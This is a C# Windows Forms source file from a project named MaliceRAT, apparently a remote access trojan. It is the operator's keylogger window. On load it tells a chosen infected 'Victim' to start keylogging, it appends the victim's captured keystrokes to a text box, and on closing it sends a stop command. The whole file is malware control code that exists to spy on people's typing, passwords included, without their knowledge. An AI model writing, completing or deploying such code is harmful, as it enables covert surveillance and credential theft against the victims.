using System;
using System.Windows.Forms;
using MaliceRAT.RatServer;

namespace MaliceRAT.RatUI
{
    public partial class KeyLoggerForm : Form
    {
        private int clientId;
        private Server server;
        public KeyLoggerForm(int clientId, Server server)
        {
            InitializeComponent();
            this.clientId = clientId;
            this.server = server;

            server.KeystrokeReceived += OnKeystrokeReceived;
        }

        private void OnKeystrokeReceived(Victim victim, string keystroke)
        {
            if (victim.Id == clientId)
            {
                textBox1.Text += keystroke + "\n";
            }
        }

        private void KeyLoggerForm_Load(object sender, EventArgs e)
        {
            server.SendMessageTo(server.GetVictimById(clientId), new { type = "start_keylogger" });
        }

        private void KeyLoggerForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            server.SendMessageTo(server.GetVictimById(clientId), new { type = "stop_keylogger" });
        }
    }
}